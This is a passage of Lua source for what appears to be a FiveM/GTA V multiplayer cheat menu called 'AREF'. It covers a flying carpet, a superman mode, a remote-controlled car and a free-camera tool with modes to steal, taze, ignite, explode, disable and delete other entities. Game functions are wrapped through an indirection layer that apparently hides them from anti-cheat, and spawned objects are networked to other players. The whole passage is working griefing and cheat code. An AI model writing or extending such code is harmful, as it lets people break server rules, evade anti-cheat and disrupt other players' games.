                            preview_magic_carpet = AREF:GetFunction("CreateObject")(AREF:GetFunction("GetHashKey")("apa_mp_h_acc_rugwoolm_03"), hit_pos.x, hit_pos.y, hit_pos.z + 0.5, false, true, true)
   
                            AREF:GetFunction("SetEntityCollision")(preview_magic_carpet, false, false)
   
                            AREF:GetFunction("SetEntityAlpha")(preview_magic_carpet, 100)
   
                            Wait(50)
   
                        elseif hit then
   
                            AREF:GetFunction("SetEntityCoords")(preview_magic_carpet, hit_pos.x, hit_pos.y, hit_pos.z + 0.5, false, false, false, false)
   
                            AREF:GetFunction("SetEntityAlpha")(preview_magic_carpet, 100)
   
                            AREF:GetFunction("FreezeEntityPosition")(preview_magic_carpet, true)
   
                            AREF:GetFunction("SetEntityRotation")(preview_magic_carpet, 0.0, 0.0, _dir.z + 0.0)
   
                            AREF:GetFunction("SetEntityCollision")(preview_magic_carpet, false, false)
   
                        end
   
    
   
                        if AREF:GetFunction("IsDisabledControlPressed")(0, AREF.Keys["MOUSE1"]) and not AREF.Showing then
   
                            magic_carpet_obj = AREF:GetFunction("CreateObject")(AREF:GetFunction("GetHashKey")("apa_mp_h_acc_rugwoolm_03"), hit_pos.x, hit_pos.y, hit_pos.z + 0.5, true, true, true)
   
                            AREF:DoNetwork(magic_carpet_obj)
   
                            local rot = AREF:GetFunction("GetEntityRotation")(preview_magic_carpet)
   
                            AREF:GetFunction("SetEntityRotation")(magic_carpet_obj, rot)
   
                            AREF.Util:DeleteEntity(preview_magic_carpet)
   
                            _no_combat = false
   
                        end
   
                    else
   
                        AREF:GetFunction("FreezeEntityPosition")(magic_carpet_obj, true)
   
                        _do_flying()
   
                        local coords = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(AREF.LocalPlayer, 0.0, 0.0, 0.0)
   
                        local carpet = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, dict.vector_origin)
   
                        local dist = AREF:GetFunction("GetDistanceBetweenCoords")(coords.x, coords.y, coords.z, carpet.x, carpet.y, carpet.z)
   
    
   
                        if dist <= 5.0 then
   
                            AREF:Draw3DText(carpet.x, carpet.y, carpet.z, "Press [E] to get " .. (magic_riding and "off" or "on") .. ".", AREF.Config.Tertiary[1], AREF.Config.Tertiary[2], AREF.Config.Tertiary[3])
   
    
   
                            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["E"]) then
   
                                magic_riding = not magic_riding
   
                                _do_riding()
   
                            end
   
                        end
   
                    end
   
                else
   
                    if preview_magic_carpet and AREF:GetFunction("DoesEntityExist")(preview_magic_carpet) then
   
                        AREF.Util:DeleteEntity(preview_magic_carpet)
   
                        _no_combat = false
   
                    end
   
    
   
                    if magic_carpet_obj and AREF:GetFunction("DoesEntityExist")(magic_carpet_obj) then
   
                        AREF.Util:DeleteEntity(magic_carpet_obj)
   
                        AREF:GetFunction("ClearPedTasks")(AREF.LocalPlayer)
   
                        _no_combat = false
   
                    end
   
                end
   
            end
   
        end)
   
    
   
        CreateThread(function()
   
            while AREF.Enabled do
   
                if AREF.Config.Player.SuperMan then
   
                    AREF:GetFunction("GivePlayerRagdollControl")(AREF.NetworkID, true)
   
                    AREF:GetFunction("SetPedCanRagdoll")(AREF.LocalPlayer, false)
   
                    AREF:GetFunction("GiveDelayedWeaponToPed")(AREF.LocalPlayer, 0xFBAB5776, 1, 0)
   
                    local up, forward = AREF:GetFunction("IsControlPressed")(0, AREF.Keys["SPACE"]), AREF:GetFunction("IsControlPressed")(0, AREF.Keys["W"])
   
    
   
                    if up or forward then
   
                        if up then
   
                            AREF:GetFunction("ApplyForceToEntity")(AREF.LocalPlayer, 1, 0.0, 0.0, 9999999.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
   
                        elseif AREF:GetFunction("IsEntityInAir")(AREF.LocalPlayer) then
   
                            AREF:GetFunction("ApplyForceToEntity")(AREF.LocalPlayer, 1, 0.0, 9999999.0, 0.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
   
                        end
   
    
   
                        Wait(0)
   
                    end
   
                else
   
                    AREF:GetFunction("GivePlayerRagdollControl")(AREF.NetworkID, false)
   
                    AREF:GetFunction("SetPedCanRagdoll")(AREF.LocalPlayer, true)
   
                end
   
    
   
                Wait(0)
   
            end
   
        end)
   
    
   
        AREF.RCCar = {
   
            Cam = nil,
   
            On = false,
   
            Driver = nil,
   
            Vehicle = nil,
   
            CamOn = false,
   
            Keys = {
   
                NUMPAD_UP = 111,
   
                NUMPAD_DOWN = 112,
   
                NUMPAD_LEFT = 108,
   
                NUMPAD_RIGHT = 109,
   
                UP = 188,
   
                DOWN = 173,
   
                LEFT = 174,
   
                RIGHT = 175
   
            }
   
        }
   
    
   
        local _rc_on
   
    
   
        function AREF.RCCar:MoveCar()
   
            AREF:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(self.Driver, true)
   
            AREF:GetFunction("NetworkRequestControlOfEntity")(self.Vehicle)
   
            AREF:GetFunction("SetVehicleEngineOn")(self.Vehicle, true)
   
            AREF:GetFunction("SetPedAlertness")(self.Driver, 0.0)
   
    
   
            if (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or AREF:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (not AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) and not AREF:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
   
                AREF:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 9, 1)
   
            end
   
    
   
            if (AREF:GetFunction("IsControlReleased")(0, self.Keys.NUMPAD_UP) and AREF:GetFunction("IsControlReleased")(0, self.Keys.UP)) or (AREF:GetFunction("IsControlJustReleased")(0, self.Keys.NUMPAD_DOWN) or AREF:GetFunction("IsControlJustReleased")(0, self.Keys.DOWN)) then
   
                AREF:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 6, 2500)
   
            end
   
    
   
            if (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or AREF:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) and (not AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) and not AREF:GetFunction("IsControlPressed")(0, self.Keys.UP)) then
   
                AREF:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 22, 1)
   
            end
   
    
   
            if (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_LEFT) or AREF:GetFunction("IsControlPressed")(0, self.Keys.LEFT)) and (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or AREF:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
   
                AREF:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 13, 1)
   
            end
   
    
   
            if (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_RIGHT) or AREF:GetFunction("IsControlPressed")(0, self.Keys.RIGHT)) and (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or AREF:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
   
                AREF:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 14, 1)
   
            end
   
    
   
            if (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or AREF:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or AREF:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
   
                AREF:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 30, 100)
   
            end
   
    
   
            if (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_LEFT) or AREF:GetFunction("IsControlPressed")(0, self.Keys.LEFT)) and (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or AREF:GetFunction("IsControlPressed")(0, self.Keys.UP)) then
   
                AREF:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 7, 1)
   
            end
   
    
   
            if (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_RIGHT) or AREF:GetFunction("IsControlPressed")(0, self.Keys.RIGHT)) and (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or AREF:GetFunction("IsControlPressed")(0, self.Keys.UP)) then
   
                AREF:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 8, 1)
   
            end
   
    
   
            if (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_LEFT) or AREF:GetFunction("IsControlPressed")(0, self.Keys.LEFT)) and (not AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) and not AREF:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (not AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) and not AREF:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
   
                AREF:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 4, 1)
   
            end
   
    
   
            if (AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_RIGHT) or AREF:GetFunction("IsControlPressed")(0, self.Keys.RIGHT)) and (not AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) and not AREF:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (not AREF:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) and not AREF:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
   
                AREF:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 5, 1)
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MWHEELUP"]) then
   
                rc_camSX = rc_camSX - 1
   
                rc_camSY = rc_camSY - 0.05
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MWHEELDOWN"]) then
   
                rc_camSX = rc_camSX + 1.1
   
                rc_camSY = rc_camSY + 0.055
   
            end
   
        end
   
    
   
        local rc_camRP, rc_camRY, rc_camRR
   
        local p, y, r
   
    
   
        local function approach(from, to, inc)
   
            if from >= to then return from end
   
    
   
            return from + inc
   
        end
   
    
   
        function AREF.RCCar:GetCamRot(gameplay_rot)
   
            local car_rot = AREF:GetFunction("GetEntityRotation")(self.Vehicle)
   
    
   
            if not p and not y and not r then
   
                p, y, r = car_rot.x, car_rot.y, car_rot.z
   
            end
   
    
   
            p = approach(p, car_rot.x, 0.5)
   
            y = approach(y, car_rot.y, 0.5)
   
            r = approach(r, car_rot.z, 0.5)
   
    
   
            return car_rot.x, car_rot.y, car_rot.z
   
        end
   
    
   
        local insults, voices = {"GENERIC_INSULT_HIGH", "GENERIC_INSULT_MED", "GENERIC_SHOCKED_HIGH", "FIGHT_RUN", "CRASH_CAR", "KIFFLOM_GREET", "PHONE_SURPRISE_EXPLOSION"}, {"S_M_Y_SHERIFF_01_WHITE_FULL_01", "A_F_M_SOUCENT_02_BLACK_FULL_01", "A_F_M_BODYBUILD_01_WHITE_FULL_01", "A_F_M_BEVHILLS_02_BLACK_FULL_01"}
   
    
   
        function AREF.RCCar:Tick()
   
            if not AREF:GetFunction("DoesCamExist")(self.Cam) then
   
                self.Cam = AREF:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)
   
                AREF:GetFunction("SetCamShakeAmplitude")(self.Cam, 0.0)
   
            end
   
    
   
            while AREF.Enabled do
   
                Wait(0)
   
    
   
                if self.On then
   
                    local rot_vec = AREF:GetFunction("GetGameplayCamRot")(0)
   
    
   
                    if not AREF:GetFunction("DoesEntityExist")(self.Vehicle) then
   
                        AREF:GetFunction("ClearPedTasksImmediately")(self.Driver)
   
                        AREF.Util:DeleteEntity(self.Driver)
   
                        self.CamOn = false
   
                        self.On = false
   
                    elseif not AREF:GetFunction("DoesEntityExist")(self.Driver) or AREF:GetFunction("GetPedInVehicleSeat")(self.Vehicle, -1) ~= self.Driver or AREF:GetFunction("IsEntityDead")(self.Driver) then
   
                        AREF:GetFunction("ClearPedTasksImmediately")(AREF:GetFunction("GetPedInVehicleSeat")(self.Vehicle, -1))
   
                        local model = AREF.FreeCam.SpawnerOptions.PED[dict.math.random(1, #AREF.FreeCam.SpawnerOptions.PED)]
   
                        AREF:RequestModelSync(model)
   
                        AREF.Util:DeleteEntity(self.Driver)
   
                        self.Driver = AREF:GetFunction("CreatePedInsideVehicle")(self.Vehicle, 24, AREF:GetFunction("GetHashKey")(model), -1, true, true)
   
                    end
   
    
   
                    if self.On then
   
                        self:MoveCar()
   
                        AREF:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.Vehicle, true)
   
                        AREF:GetFunction("SetVehicleDoorsLocked")(self.Vehicle, 2)
   
    
   
                        if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["E"]) then
   
                            AREF:GetFunction("PlayAmbientSpeechWithVoice")(self.Driver, insults[dict.math.random(1, #insults)], voices[dict.math.random(1, #voices)], "SPEECH_PARAMS_FORCE_SHOUTED", false)
   
                        end
   
                    end
   
    
   
                    if self.CamOn and not _rc_on then
   
                        AREF:GetFunction("SetCamActive")(self.Cam, true)
   
                        AREF:GetFunction("SetCamAffectsAiming")(self.Cam, false)
   
                        AREF:GetFunction("SetCamActive")(AREF:GetFunction("GetRenderingCam")(), false)
   
                        AREF:GetFunction("RenderScriptCams")(true, false, false, true, true)
   
                        _rc_on = true
   
                        local coords = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Vehicle, 0.0, 0.0, 0.0) + (AREF:GetFunction("GetEntityForwardVector")(self.Vehicle) * (AREF:GetModelLength(self.Vehicle) * -0.85))
   
                        rc_camX, rc_camY, rc_camZ = coords.x, coords.y, coords.z
   
                        local rot = AREF:GetFunction("GetEntityRotation")(self.Vehicle)
   
                        rc_camRP, rc_camRY, rc_camRR = rot.x, rot.y, rot.z
   
                    elseif not self.CamOn and _rc_on then
   
                        AREF:GetFunction("DisableAllControlActions")(0)
   
                        AREF:EnableMouse()
   
                        AREF:GetFunction("SetCamActive")(self.Cam, false)
   
                        AREF:GetFunction("SetCamActive")(AREF:GetFunction("GetRenderingCam")(), true)
   
                        AREF:GetFunction("RenderScriptCams")(false, false, false, false, false)
   
                        AREF:GetFunction("SetFocusEntity")(AREF.LocalPlayer)
   
                        AREF.FreeCam:DisableMovement(false)
   
                        _rc_on = false
   
                    end
   
    
   
                    if self.CamOn and _rc_on then
   
                        AREF:GetFunction("StopGameplayCamShaking")(true)
   
                        local ent_pos = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Vehicle, 0.0, 0.0, 0.0) + (AREF:GetFunction("GetEntityForwardVector")(self.Vehicle) * (AREF:GetModelLength(self.Vehicle) * -0.85))
   
                        local coords = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(AREF.LocalPlayer)
   
                        AREF:GetFunction("RequestCollisionAtCoord")(coords.x, coords.y, coords.z)
   
                        AREF:DrawIbuttons()
   
                        AREF.FreeCam:DisableMovement(true)
   
                        rc_camX, rc_camY, rc_camZ = ent_pos.x, ent_pos.y, ent_pos.z
   
    
   
                        if rc_camSY then
   
                            rc_camZ = rc_camZ + rc_camSY
   
                        end
   
    
   
                        rc_camZ = rc_camZ + (AREF:GetModelHeight(self.Vehicle) * 1.2)
   
                        rc_camRP, rc_camRY, rc_camRR = self:GetCamRot(rot_vec)
   
                        AREF:GetFunction("SetFocusPosAndVel")(rc_camX, rc_camY, rc_camZ, 0, 0, 0)
   
                        AREF:GetFunction("SetCamCoord")(self.Cam, rc_camX, rc_camY, rc_camZ)
   
                        AREF:GetFunction("SetCamRot")(self.Cam, rc_camRP + 0.0, rc_camRY + 0.0, rc_camRR + 0.0)
   
                        AREF:GetFunction("SetCamFov")(self.Cam, rc_camSX + 0.0)
   
                    end
   
                end
   
            end
   
        end
   
    
   
        AREF.FreeCam = {
   
            Cam = nil,
   
            On = false,
   
            Modifying = nil,
   
            Mode = 1,
   
            Modes = {
   
                ["LOOK_AROUND"] = 1,
   
                ["REMOVER"] = 2,
   
                ["PED_SPAWNER"] = 3,
   
                ["OBJ_SPAWNER"] = 4,
   
                ["VEH_SPAWNER"] = 5,
   
                ["PREMADE_SPAWNER"] = 6,
   
                ["TELEPORT"] = 7,
   
                ["RC_CAR"] = 8,
   
                ["STEAL"] = 9,
   
                ["TAZE"] = 10,
   
                ["HYDRANT"] = 11,
   
                ["FIRE"] = 12,
   
                ["SPIKE_STRIPS"] = 13,
   
                ["DISABLE_VEHICLE"] = 14,
   
                ["EXPLODE"] = 15,
   
                ["SHOOT_BULLET"] = 16
   
            },
   
            ModeNames = {
   
                [1] = "Look Around",
   
                [2] = "Remover",
   
                [3] = "Ped Spawner",
   
                [4] = "Object Spawner",
   
                [5] = "Vehicle Spawner",
   
                [6] = "Premade Spawner",
   
                [7] = "Teleport",
   
                [8] = "RC Car",
   
                [9] = "Steal",
   
                [10] = "Taze Entity",
   
                [11] = "Hydrant Entity",
   
                [12] = "Fire Entity",
   
                [13] = "Place Spike Strips",
   
                [14] = "Disable Vehicle",
   
                [15] = "Explode",
   
                [16] = "Shoot Bullet"
   
            }
   
        }
   
    
   
        function AREF.FreeCam:Switcher()
   
            if not self.On then return end
   
            local cur = self.Mode
   
            local new = cur
   
            if self.DraggingEntity and AREF:GetFunction("DoesEntityExist")(self.DraggingEntity) then return end
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MWHEELDOWN"]) then
   
                new = cur - 1
   
    
   
                if not self.ModeNames[new] then
   
                    new = #self.ModeNames
   
                end
   
    
   
                self.Mode = new
   
            end
   
    
   
            if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MWHEELUP"]) then
   
                new = cur + 1
   
    
   
                if not self.ModeNames[new] then
   
                    new = 1
   
                end
   
    
   
                self.Mode = new
   
            end
   
        end
   
    
   
        function AREF.FreeCam:Toggle(mode)
   
            self.On = not self.On
   
            self.Mode = mode
   
        end
   
    
   
        function AREF.FreeCam:GetModelSize(hash)
   
            return AREF:GetFunction("GetModelDimensions")(hash)
   
        end
   
    
   
        function AREF.FreeCam:DrawBoundingBox(entity, r, g, b, a)
   
            if entity then
   
                r = r or 255
   
                g = g or 0
   
                b = b or 0
   
                a = a or 40
   
                local model = AREF:GetFunction("GetEntityModel")(entity)
   
                local min, max = AREF:GetFunction("GetModelDimensions")(model)
   
                local top_front_right = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, max)
   
                local top_back_right = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, min.y, max.z))
   
                local bottom_front_right = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, max.y, min.z))
   
                local bottom_back_right = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, min.y, min.z))
   
                local top_front_left = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, max.y, max.z))
   
                local top_back_left = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, min.y, max.z))
   
                local bottom_front_left = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, max.y, min.z))
   
                local bottom_back_left = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, min)
   
                -- LINES
   
                -- RIGHT SIDE
   
                AREF:GetFunction("DrawLine")(top_front_right, top_back_right, r, g, b, a)
   
                AREF:GetFunction("DrawLine")(top_front_right, bottom_front_right, r, g, b, a)
   
                AREF:GetFunction("DrawLine")(bottom_front_right, bottom_back_right, r, g, b, a)
   
                AREF:GetFunction("DrawLine")(top_back_right, bottom_back_right, r, g, b, a)
   
                -- LEFT SIDE
   
                AREF:GetFunction("DrawLine")(top_front_left, top_back_left, r, g, b, a)
   
                AREF:GetFunction("DrawLine")(top_back_left, bottom_back_left, r, g, b, a)
   
                AREF:GetFunction("DrawLine")(top_front_left, bottom_front_left, r, g, b, a)
   
                AREF:GetFunction("DrawLine")(bottom_front_left, bottom_back_left, r, g, b, a)
   
                -- Connection
   
                AREF:GetFunction("DrawLine")(top_front_right, top_front_left, r, g, b, a)
   
                AREF:GetFunction("DrawLine")(top_back_right, top_back_left, r, g, b, a)
   
                AREF:GetFunction("DrawLine")(bottom_front_left, bottom_front_right, r, g, b, a)
   
                AREF:GetFunction("DrawLine")(bottom_back_left, bottom_back_right, r, g, b, a)
   
                -- POLYGONS
   
                -- FRONT
   
                AREF:GetFunction("DrawPoly")(top_front_left, top_front_right, bottom_front_right, r, g, b, a)
   
                AREF:GetFunction("DrawPoly")(bottom_front_right, bottom_front_left, top_front_left, r, g, b, a)
   
                -- TOP
   
                AREF:GetFunction("DrawPoly")(top_front_right, top_front_left, top_back_right, r, g, b, a)
   
                AREF:GetFunction("DrawPoly")(top_front_left, top_back_left, top_back_right, r, g, b, a)
   
                -- BACK
   
                AREF:GetFunction("DrawPoly")(top_back_right, top_back_left, bottom_back_right, r, g, b, a)
   
                AREF:GetFunction("DrawPoly")(top_back_left, bottom_back_left, bottom_back_right, r, g, b, a)
   
                -- LEFT
   
                AREF:GetFunction("DrawPoly")(top_back_left, top_front_left, bottom_front_left, r, g, b, a)
   
                AREF:GetFunction("DrawPoly")(bottom_front_left, bottom_back_left, top_back_left, r, g, b, a)
   
                -- RIGHT
   
                AREF:GetFunction("DrawPoly")(top_front_right, top_back_right, bottom_front_right, r, g, b, a)
   
                AREF:GetFunction("DrawPoly")(top_back_right, bottom_back_right, bottom_front_right, r, g, b, a)
   
                -- BOTTOM
   
                AREF:GetFunction("DrawPoly")(bottom_front_left, bottom_front_right, bottom_back_right, r, g, b, a)
   
                AREF:GetFunction("DrawPoly")(bottom_back_right, bottom_back_left, bottom_front_left, r, g, b, a)
   
    
   
                return true
   
            end
   
    
   
            return false
   
        end
   
    
   
        function AREF.FreeCam:Crosshair(on)
   
            if on then
   
                AREF:GetFunction("DrawRect")(0.5, 0.5, 0.008333333, 0.001851852, AREF.Config.Tertiary[1], AREF.Config.Tertiary[2], AREF.Config.Tertiary[3], 255)
   
                AREF:GetFunction("DrawRect")(0.5, 0.5, 0.001041666, 0.014814814, AREF.Config.Tertiary[1], AREF.Config.Tertiary[2], AREF.Config.Tertiary[3], 255)
   
            else
   
                AREF:GetFunction("DrawRect")(0.5, 0.5, 0.008333333, 0.001851852, 100, 100, 100, 255)
   
                AREF:GetFunction("DrawRect")(0.5, 0.5, 0.001041666, 0.014814814, 100, 100, 100, 255)
   
            end
   
        end
   
    
   
        function AREF:Draw3DText(x, y, z, text, r, g, b)
   
            self:GetFunction("SetDrawOrigin")(x, y, z, 0)
   
            self:GetFunction("SetTextFont")(0)
   
            self:GetFunction("SetTextProportional")(0)
   
            self:GetFunction("SetTextScale")(0.0, 0.17)
   
            self:GetFunction("SetTextColour")(r, g, b, 255)
   
            self:GetFunction("SetTextOutline")()
   
            self:GetFunction("BeginTextCommandDisplayText")("STRING")
   
            self:GetFunction("SetTextCentre")(1)
   
            self:GetFunction("AddTextComponentSubstringPlayerName")(text)
   
            self:GetFunction("EndTextCommandDisplayText")(0.0, 0.0)
   
            self:GetFunction("ClearDrawOrigin")()
   
        end
   
    
   
        function AREF:DrawScaled3DText(x, y, z, textInput, fontId, scaleX, scaleY)
   
            local coord = self:GetFunction("GetFinalRenderedCamCoord")()
   
            local px, py, pz = coord.x, coord.y, coord.z
   
            local dist = self:GetFunction("GetDistanceBetweenCoords")(px, py, pz, x, y, z)
   
            local scale = (1 / dist) * 20
   
            local fov = (1 / self:GetFunction("GetGameplayCamFov")()) * 100
   
            local scale = scale * fov
   
            self:GetFunction("SetTextScale")(scaleX * scale, scaleY * scale)
   
            self:GetFunction("SetTextFont")(fontId)
   
            self:GetFunction("SetTextProportional")(1)
   
            self:GetFunction("SetTextColour")(250, 250, 250, 255) -- You can change the text color here
   
            self:GetFunction("SetTextDropShadow")(1, 1, 1, 1, 255)
   
            self:GetFunction("SetTextEdge")(2, 0, 0, 0, 150)
   
            self:GetFunction("SetTextDropShadow")()
   
            self:GetFunction("SetTextOutline")()
   
            self:GetFunction("BeginTextCommandDisplayText")("STRING")
   
            self:GetFunction("SetTextCentre")(1)
   
            self:GetFunction("AddTextComponentSubstringPlayerName")(textInput)
   
            self:GetFunction("SetDrawOrigin")(x, y, z + 2, 0)
   
            self:GetFunction("EndTextCommandDisplayText")(0.0, 0.0)
   
            self:GetFunction("ClearDrawOrigin")()
   
        end
   
    
   
        function AREF.FreeCam:DrawInfoCard(entity)
   
            if not AREF:GetFunction("DoesEntityExist")(entity) then return end
   
            local coords = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, 0.0, 0.0, 0.0)
   
            local angle = AREF:GetFunction("GetEntityRotation")(entity)
   
    
   
            if dict.frozen_ents[entity] == nil then
   
                dict.frozen_ents[entity] = false
   
            end
   
    
   
            local str = {[[ Model: ]] .. AREF:GetFunction("GetEntityModel")(entity), [[ Pos: ]] .. ("x: %.2f, y: %.2f, z: %.2f"):format(coords.x, coords.y, coords.z), [[ Rot: ]] .. ("x: %.2f, y: %.2f, z: %.2f"):format(angle.x, angle.y, angle.z), [[ Frozen: ]] .. dict.tostring(dict.frozen_ents[entity])}
   
            local y = coords.z
   
    
   
            for _, val in dict.pairs(str) do
   
                AREF:DrawScaled3DText(coords.x, coords.y, y, val, 4, 0.1, 0.1)
   
                y = y - 0.35
   
            end
   
        end
   
    
   
        function AREF.FreeCam:CheckType(entity, type)
   
            if type == "ALL" then return AREF:GetFunction("IsEntityAnObject")(entity) or AREF:GetFunction("IsEntityAVehicle")(entity) or AREF:GetFunction("IsEntityAPed")(entity) end
   
            if type == "VEHICLE" then return AREF:GetFunction("IsEntityAVehicle")(entity) end
   
            if type == "PED" then return AREF:GetFunction("IsEntityAPed")(entity) end
   
    
   
            return true
   
        end
   
    
   
        function AREF.FreeCam:GetType(entity)
   
            if AREF:GetFunction("IsEntityAnObject")(entity) then return "OBJECT" end
   
            if AREF:GetFunction("IsEntityAVehicle")(entity) then return "VEHICLE" end
   
            if AREF:GetFunction("IsEntityAPed")(entity) then return "PED" end
   
        end
   
    
   
        function AREF.FreeCam:Clone(entity)
   
            local type = self:GetType(entity)
   
            if not type then return end
   
            local where = AREF:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, 0.1, 0.1, 0.1)
   
            local rot = AREF:GetFunction("GetEntityRotation")(entity)
   
    
   
            if type == "OBJECT" then
   
                local clone = AREF:GetFunction("CreateObject")(AREF:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, true, true, true)
   
                AREF:DoNetwork(clone)
   
                AREF:GetFunction("SetEntityRotation")(clone, rot)
   
                dict.frozen_ents[clone] = dict.frozen_ents[entity]
   
                self.DraggingEntity = clone
   
                AREF:AddNotification("INFO", "Cloned object " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, entity))
   
                Wait(50)
   
            elseif type == "VEHICLE" then
   
                local clone = AREF:GetFunction("CreateVehicle")(AREF:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, AREF:GetFunction("GetEntityHeading")(entity), true, true)
   
                AREF:GetFunction("SetEntityRotation")(clone, rot)
   
                dict.frozen_ents[clone] = dict.frozen_ents[entity]
   
                self.DraggingEntity = clone
   
                AREF:AddNotification("INFO", "Cloned vehicle " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, entity))
   
            elseif type == "PED" then
   
                local clone = AREF:GetFunction("CreatePed")(4, AREF:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, AREF:GetFunction("GetEntityHeading")(entity), true, true)
   
                AREF:GetFunction("SetEntityRotation")(clone, rot)
   
                dict.frozen_ents[clone] = dict.frozen_ents[entity]
   
                self.DraggingEntity = clone
   
                AREF:AddNotification("INFO", "Cloned ped " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, entity))
   
            end
   
        end
   
    
   
        function AREF.FreeCam:Remover(entity, type)
   
            AREF:SetIbuttons({{AREF:GetFunction("GetControlInstructionalButton")(0, AREF.Keys["MOUSE1"], 0), "Delete"}, {"b_117", "Change Mode"}})
   
    
   
            if AREF:GetFunction("DoesEntityExist")(entity) and AREF:GetFunction("DoesEntityHaveDrawable")(entity) and self:CheckType(entity, type) then
   
                self:DrawBoundingBox(entity, 255, 50, 50, 50)
   
    
   
                if AREF:GetFunction("IsDisabledControlJustPressed")(0, AREF.Keys["MOUSE1"]) and not AREF.Showing then
   
                    if entity == AREF.LocalPlayer then return AREF:AddNotification("ERROR", "You can not delete yourself!", 10000) end
   
                    if _is_ped_player(entity) then return AREF:AddNotification("ERROR", "You can not delete players!", 10000) end
   
                    self:DrawBoundingBox(entity, 255, 50, 50, 50)
   
                    AREF:AddNotification("INFO", "Deleted " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, dict.tostring(entity)), 10000)
   
                    AREF.Util:DeleteEntity(entity)
   
    
   
                    return
   
                end
   
            end
   
        end
   
    
   
        function AREF.FreeCam:Attack(attacker, victim)
   
            AREF:GetFunction("ClearPedTasks")(attacker)
   
    
   
            if AREF:GetFunction("IsEntityAPed")(victim) then
   
                AREF:GetFunction("TaskCombatPed")(attacker, victim, 0, 16)
   
                AREF:AddNotification("INFO", ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, dict.tostring(attacker)) .. " attacking " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, dict.tostring(victim)), 5000)
   
            elseif AREF:GetFunction("IsEntityAVehicle")(victim) then
   
                CreateThread(function()
   
                    AREF:StealVehicleThread(attacker, victim)
   
                end)
   
    
   
